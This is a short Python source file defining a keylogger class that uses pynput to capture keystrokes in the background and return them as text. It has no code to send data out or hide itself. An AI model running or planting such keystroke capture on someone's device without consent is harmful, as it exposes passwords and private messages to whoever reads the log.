from pynput import keyboard
import time


class IKeylogger:
    def __init__(self):
        self.my_list = []
        self.Listener = None

    def on_press(self,key):
        try:
            tempKey = str(key.char)
        except AttributeError:
            tempKey = key
            if tempKey == keyboard.Key.backspace:
                self.my_list = self.my_list[:-1]
                return
            elif tempKey == keyboard.Key.enter:
                tempKey = '\n'
            elif tempKey == keyboard.Key.space:
                tempKey = " "
            else:
                tempKey = str(tempKey)
        self.my_list.append(tempKey)

    def start_logging(self):
        self.Listener = keyboard.Listener(on_press= self.on_press)
        self.Listener.start()

    def stop_logging(self):
        self.Listener.stop()

    def get_logged_keys(self):
        return "".join(self.my_list)

print(5)